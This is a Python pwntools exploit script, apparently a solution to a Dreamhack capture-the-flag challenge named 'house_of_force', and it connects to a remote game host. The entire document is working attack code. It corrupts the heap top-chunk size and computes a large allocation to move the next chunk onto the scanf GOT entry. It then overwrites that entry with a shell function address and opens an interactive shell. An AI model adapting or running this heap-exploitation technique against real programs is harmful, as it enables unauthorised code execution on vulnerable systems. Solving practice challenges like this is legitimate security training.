from pwn import *

def Create(size, data):
    p.sendlineafter('> ', '1')
    p.sendlineafter(': ', str(size))
    p.sendlineafter(': ', data)
    return p.recvline().replace('\n', '')
def Write(idx, offset, value):
    p.sendlineafter('> ', '2')
    p.sendlineafter(': ', str(idx))
    p.sendlineafter(': ', str(offset))
    p.sendlineafter(': ', str(value))
    
#p = process('house_of_force')
p = remote('host1.dreamhack.games', 11263)
_recv = Create(8, 'a'*8)
addr_heap = int(_recv.split(': ')[0], 16)
addr_firstChunk = addr_heap + 0x10
addr_firstChunkSize = addr_firstChunk - 4
addr_shell = 0x804887e
elf = ELF('house_of_force')
addr_got = elf.got['__isoc99_scanf']
addr_target = addr_got
size_exploit = addr_target - addr_firstChunk
size_exploit = size_exploit - 8 if size_exploit % 8 == 0 else size_exploit - 8 + (8 - size_exploit%8) - 8
addr_calc = addr_firstChunk + size_exploit + 8
Write(0, 12/4, 0xffffffff)
Create(size_exploit, 'a')
Create(4*50, p32(addr_shell)*((addr_target - addr_calc)/4 + 1) + '\x00')
p.interactive()

